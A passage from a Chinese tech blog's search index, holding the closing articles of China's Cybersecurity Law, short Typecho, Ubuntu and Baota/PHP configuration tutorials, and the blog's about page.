网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><p><strong>第七章　附　则</strong></p><p>第七十六条　本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>第七十九条　本法自2017年6月1日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>另一种Handsome主题“解密”思路</title>
      <link href="/posts/b85ac4f9/"/>
      <url>/posts/b85ac4f9/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>群友太热情了！天天问我这个关于 functions.php 被加密的解决办法。</p><p>所以…</p><p>授人以鱼不如授人以渔，教程来了！</p><h2 id="操作">操作</h2><p>首先将原先被加密的 <code>functions.php</code> 改名为 <code>funct1ons.php</code> ，以便操作。</p><p>然后新建一个 <code>functions.php</code> ，在文件中填入以下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 引入被加密的原版 functions.php</span></span><br><span class="line"><span class="comment"> * 请确保文件名为 functions.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;funct1ons.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 自定义代码区</span></span><br><span class="line"><span class="comment"> * 在下方添加你的自定义代码</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="后记">后记</h2><p>这种方法的原理就是在新的 functions.php 文件中引入原先的 <code>functions.php</code> ，以此来达到解决主题 <code>functions.php</code> 被加密的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开启 Typecho 支持 emoji 表情</title>
      <link href="/posts/91801ce1/"/>
      <url>/posts/91801ce1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>发现 <code>typecho</code> 并不支持 <code>emoji</code> 表情，提交带有 <code>emoji</code> 表情的时候，会提示 <code>Data query error</code>, 因为 typecho 安装后的数据库是 <code>utf8</code>， 并不是 <code>utf8mb4</code>，所以只需要修改下数据表的字符编码就行了。</p><h2 id="修改数据库储存编码">修改数据库储存编码</h2><p>登录服务器执行 <code>mysql</code> 操作，切换到 <code>typecho</code> 的数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p<span class="operator">/</span><span class="operator">/</span> 然后输入你的数据库root密码</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use typecho; <span class="operator">/</span><span class="operator">/</span> 你的数据库名 名称可能不一样</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure><p>执行以下 sql 语句，修改数据库中表的编码格式 <code>utf8mb4</code>，如果还有其他表，请一同修改。</p><p>请一同修改。</p><p><code>格式：alter table 表名称 convert to character set utf8mb4 collate utf8mb4_general_ci;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_comments <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_contents <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_fields <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_links <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_metas <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_options <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_relationships <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> typecho_users <span class="keyword">convert</span> <span class="keyword">to</span> <span class="type">character</span> <span class="keyword">set</span> utf8mb4 <span class="keyword">collate</span> utf8mb4_general_ci;</span><br></pre></td></tr></table></figure><h2 id="修改-config-inc-php-配置">修改 config.inc.php 配置</h2><p>进入到typecho网站根目录，找到 <strong>config.inc.php</strong> 文件，跳转到<code>60</code>行附近，在文件底部，修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 定义数据库参数 */</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="string">&#x27;Pdo_Mysql&#x27;</span>, <span class="string">&#x27;typecho_&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;***&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;***&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8mb4&#x27;</span>,<span class="comment">/*修改编码为utf8mb4*/</span></span><br><span class="line">  <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;***&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;****&#x27;</span>,</span><br><span class="line">), <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br></pre></td></tr></table></figure><p>修改后保存文件即可。</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决 Ubuntu 18.04.3开关机90秒等待</title>
      <link href="/posts/e9ed3974/"/>
      <url>/posts/e9ed3974/</url>
      
        <content type="html"><![CDATA[<p>一、现象</p><p>Ubuntu关机或重启时提示 <code>A stop job is running for snappy daemon</code> 导致关机慢。</p><p>二、解决方法</p><p>切换root用户执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/systemd/system.conf</span><br></pre></td></tr></table></figure><p>搜索到下面两个变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#DefaultTimeoutStartSec=90s</span></span><br><span class="line"><span class="comment">#DefaultTimeoutStopSec=90s</span></span><br></pre></td></tr></table></figure><p>删去前面的注释符<code>#</code></p><p>修改下面两个变量时间为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DefaultTimeoutStartSec=10s</span><br><span class="line">DefaultTimeoutStopSec=10s</span><br></pre></td></tr></table></figure><p><code>:wq</code>保存退出后</p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔面板PHP7.3丢失zip扩展解决方案</title>
      <link href="/posts/e5031faa/"/>
      <url>/posts/e5031faa/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>近日，将服务器操作系统切换至 Aliyun Linux 安装完宝塔面板会发现丢失Zip扩展，其实在PHP 7.3内是有Zip扩展的，但是可能因为系统原因没能自动装上。</p><h2 id="解决方案">解决方案</h2><p>php要调用ZipArchive类的时候，需要安装了ZIP拓展库才行，而zip拓展库需要先安装libzip。</p><p>依次按照下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~ &amp;&amp; <span class="built_in">mkdir</span> zip &amp;&amp; <span class="built_in">cd</span> zip</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/lib/libzip/include/zipconf.h /usr/local/include/zipconf.h</span><br><span class="line">wget https://nih.at/libzip/libzip-1.2.0.tar.gz</span><br><span class="line">tar -zxvf libzip-1.2.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libzip-1.2.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /www/server/php/73/src/ext/zip/</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;extension = zip.so&quot;</span> &gt;&gt; /www/server/php/73/etc/php.ini</span><br><span class="line">service php-fpm-73 reload</span><br></pre></td></tr></table></figure><h3 id="验证">验证</h3><p>点击查看PHPinfo，如存在Zip扩展就已经安装好了</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 宝塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于本站</title>
      <link href="/posts/site/"/>
      <url>/posts/site/</url>
      
        <content type="html"><![CDATA[<h2 id="这是哪里？">这是哪里？</h2><p>这里是这里是 <a href="https://ollyhsu.github.io/">Olly’s Blog</a> Hexo版，此站将会替代曾经的Typecho版博客。</p><h2 id="关于本站">关于本站</h2><p>我是 Oliver，一名信息安全爱好者，本人研究兴趣为二进制安全及逆向分析方向，点<a href="../../about/">【这儿】</a>考以了解关于我的更多信息。</p><p>本站记录博主的学习经验及日常生活，专注分享二进制安全、漏洞挖掘、逆向分析、Web开发、iOS开发、安全运维、机器学习等学习经验及资源，致力于打造一个高质量信息安全学习资源分享平台。</p><p>小站不以盈利为目的，作为一名即将毕业的程序猿和CTF爱好者，总应该有一个属于自己的网站。做一个网站对于后端程序猿来说 So seay，只是前端比较 hard 而已。本人在校大三学生考研狗一枚，目前也没有太多课余时间自己去写博客系统，所以直接使用建站框架 Hexo 及 Butterfly 主题。这算是个自己的小窝吧，一些简单的日记、记录、教程就可以简简单单放到这里。下面我将与大家分享我的 Hexo 博客是怎么样实现的及本站的发展历程。</p><h2 id="搬迁缘由">搬迁缘由</h2><p>首先要说明的就是我还是一个学生，原先所购的服务器均是<strong>阿里云学生机</strong>，这意味着 24 岁后就不能享受学生优惠服务了。🤮 然而对于我这个没有丰厚收入的人来说，这简直时天文数字。</p><p>一开始也打算换成国外的服务器，但是每年也是 300+ 的支出，服务器在国外就意味着在国内要做一些访问优化，不然我这心里怎么能忍受的了呢。</p><p>经过再三考虑决定使用 Hexo + Github 搭建一个免费的博客，域名本打算用 GitHub 免费的，但想想还是算了。</p><p>但是Github访问速度吧。。。大家都懂得，我就不多说了~😄</p><p>当前博客环境：<span class="inline-tag grey">Github</span> + <span class="inline-tag blue">Coding</span> + <span class="inline-tag red">Gitee</span>+ <span class="inline-tag grey">Vercel</span> + <span class="inline-tag red">Jsdeliver</span> + <span class="inline-tag blue">Butterfly</span></p><h2 id="地址说明">地址说明</h2><p>原Typecho博客采用的地址是不加 <code>www</code> 的根域名，这是当初一个错误的决定。因此，当此博客关闭时，这个域名不会解析到新博客，新博客地址为加 <code>wwww</code> 的即 <code>https://ollyhsu.github.io</code></p><h2 id="文章说明">文章说明</h2><p>文章这件事我思考了很久，开始只决定留一些有意义的文章，一些学习笔记什么的可能就直接放弃了。 不过这么一来好像也就没什么可以留的了，所以我还是会记些笔记和文章~。</p><h2 id="发展历程">发展历程</h2><p>从最初做公众号自媒体也有两年多了，下面就记录一下几个关键的时间点吧~</p><div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-29</p></div></div><div class='timeline-item-content'><p>更新Hexo v7.1.1 &amp; Butterfly v4.13.0</p></div></div></div><div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-01</p></div></div><div class='timeline-item-content'><p>更新Butterfly 4.1.0及重新配置Twikoo评论服务</p></div></div></div><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2021</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>10-03</p></div></div><div class='timeline-item-content'><p>基于Github Action完成Hexo自动部署配置（省时高效）</p></div></div></div><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2020</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-10</p></div></div><div class='timeline-item-content'><p>主题视觉疲劳，且加载较慢，购买了比较火的付费主题Handsome</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-13</p></div></div><div class='timeline-item-content'><p>使用Typecho重新部署博客网站</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-10</p></div></div><div class='timeline-item-content'><p>域名备案完成，启用blog二级域名作为博客域名</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>07-21</p></div></div><div class='timeline-item-content'><p>网站服务器迁移至阿里云</p></div></div></div><div class="timeline orange"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2019</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-10</p></div></div><div class='timeline-item-content'><p>主题视觉疲劳，且加载较慢，购买了比较火的付费主题Handsome</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-13</p></div></div><div class='timeline-item-content'><p>使用Typecho重新部署博客网站</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-10</p></div></div><div class='timeline-item-content'><p>域名备案完成，启用blog二级域名作为博客域名</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>07-21</p></div></div><div class='timeline-item-content'><p>网站服务器迁移至阿里云</p></div></div></div><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2018</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>10-31</p></div></div><div class='timeline-item-content'><p>使用Wordpress进行个人博客建站</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>10-27</p></div></div><div class='timeline-item-content'><p>运营抖音、微视视频自媒体，购置VPS服务器并注册域名</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>06-15</p></div></div><div class='timeline-item-content'><p>开通个人微信公众号</p></div></div></div><!-- ## 打赏记录打赏记录于 2021 年 02 月 15 日。其中时间与订单交易时间一致，昵称如果没有备注，默认即交易中的名称|    时间    |  途径  |  昵称  | 金额  || :--------: | :----: | :----: | :---: || 2021/01/01 | 支付宝 | 维**柯 | 5.00 || 2021/01/02 |  微信  | 小**维  | 1.00 |注：如果您觉得侵犯了您的隐私，那么可以QQ私信我，删除昵称。 -->]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 公告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 关于 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
